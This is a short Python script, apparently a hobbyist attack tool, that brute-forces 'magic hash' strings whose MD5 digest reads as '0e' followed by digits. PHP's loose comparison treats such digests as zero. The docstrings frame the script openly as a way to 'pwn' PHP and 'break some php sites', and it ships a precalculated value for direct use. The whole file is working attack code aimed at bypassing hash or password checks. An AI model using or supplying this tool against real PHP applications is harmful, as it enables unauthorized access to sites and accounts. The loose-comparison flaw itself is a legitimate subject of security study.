#!/usr/bin/env python3

"""PWN PHP using magic numbers!

It turns out that PHP type comparisons are even worse than javascript!
This video does a good job of explaining the security implications:
    https://www.youtube.com/watch?v=-1kftH6t5VA
Basically if any string in PHP starts with "0e" it can be converted to
the integer 0 when comparing it with another integer.
"""

import hashlib
import sys
from itertools import product
from string import ascii_letters, digits

ATTEMPTS = 10

def is_magic(text):
    """Check if the given `text` starts with "0e" when hashed."""
    enc = hashlib.md5(text.encode('utf-8')).hexdigest()
    return enc[:2] == '0e' and enc[2:].isdigit()

def main():
    """Generate a magic number for PHP pwning!

    Given a prefix as an arg, brute force an md5 hash
    that starts with "0e", which will allow us to break
    some php sites!
    """
    if len(sys.argv) > 1:
        prefix = sys.argv[1]
    else:
        print('No prefix?')
        print('Here is a pre-calculated one!')
        print('Value: byGcY')
        return True
    for i in range(ATTEMPTS):
        for perms in product(ascii_letters + digits, repeat = i):
            value = ''.join(perms)
            if is_magic(prefix + value):
                print('Found One!!')
                print('Full Value: ' + prefix + value)
                print('Suffix Val: ' + value)
                return True
    print('No luck, try increasing the attempts.')
    return False


if __name__ == '__main__':
    main()
